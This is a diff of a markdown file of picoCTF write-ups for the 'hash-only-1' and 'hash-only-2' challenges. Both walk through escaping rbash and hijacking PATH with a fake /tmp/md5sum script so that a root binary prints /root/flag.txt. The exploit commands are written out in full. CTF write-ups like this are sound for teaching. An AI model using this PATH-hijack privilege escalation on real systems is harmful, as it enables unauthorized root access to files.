@@ -387,6 +387,7 @@ Then you get the flag.
 
 ## ID 489 — hash-only-2
 ## Approach:
+```
     1. Connect to the instance using the provided SSH credentials:
         ssh ctf-player@rescued-float.picoctf.net -p XXXXXX
         password: XXXXXXX
@@ -399,11 +400,11 @@ Then you get the flag.
         → it computes the MD5 hash of /root/flag.txt as root, but never reveals the actual flag.
 
     4. Create a fake md5sum executable in /tmp that will instead print the real flag:
-
+```
 #!/bin/sh
 cat /root/flag.txt
 
-
+```
     Commands used:
 
         echo '#!/bin/sh' > /tmp/md5sum
@@ -420,3 +421,45 @@ cat /root/flag.txt
     7. Run flaghasher again:
         flaghasher
         → since the binary runs as root, it now executes our fake md5sum and prints the real flag.
+```
+
+---
+
+## ID 488 — hash-only-1
+## Approach:
+
+    1. Connect to the instance using the provided SSH credentials:
+        ssh ctf-player@rescued-float.picoctf.net -p <port>
+        password: <given password>
+
+    2. Escape the restricted rbash environment by launching a normal shell:
+        bash
+
+    3. List files and run the vulnerable binary:
+        ls --all
+        ./flaghasher
+        → the program computes the MD5 hash of /root/flag.txt as root, but does not reveal the real flag.
+
+    4. Create a fake md5sum executable in /tmp that prints the real flag instead of hashing it:
+
+#!/bin/sh
+cat /root/flag.txt
+
+
+    Commands used:
+
+echo '#!/bin/sh' > /tmp/md5sum
+echo 'cat /root/flag.txt' >> /tmp/md5sum
+chmod +x /tmp/md5sum
+
+
+    5. Add /tmp to the beginning of the PATH so the system uses our fake md5sum:
+        export PATH=/tmp:$PATH
+
+    6. Confirm the PATH hijack worked:
+        which md5sum
+        → shows /tmp/md5sum
+
+    7. Run the binary again to trigger the exploit:
+        ./flaghasher
+        → the program now executes our fake md5sum as root and prints the real flag.
